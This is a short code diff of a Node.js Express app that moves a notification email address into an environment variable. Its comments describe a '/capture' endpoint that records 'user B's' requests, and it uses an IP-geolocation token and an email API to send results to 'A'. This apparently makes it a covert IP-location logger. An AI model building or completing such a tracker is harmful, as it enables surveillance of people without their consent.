@@ -5,11 +5,10 @@ const querystring = require('querystring');
 // 创建Express应用
 const app = express();
 
-// 环境变量设置
 const IPINFO_TOKEN = process.env.IPINFO_TOKEN; // 从Render环境变量中读取
 const SENDCLOUD_API_USER = process.env.SENDCLOUD_API_USER;
 const SENDCLOUD_API_KEY = process.env.SENDCLOUD_API_KEY;
-const EMAIL_RECEIVER = 'your_email@example.com'; // A的电子邮件地址
+const EMAIL_RECEIVER = process.env.EMAIL_RECEIVER; // 使用环境变量定义接收者邮箱地址
 
 // 设置端点以捕获B用户的请求
 app.get('/capture', async (req, res) => {
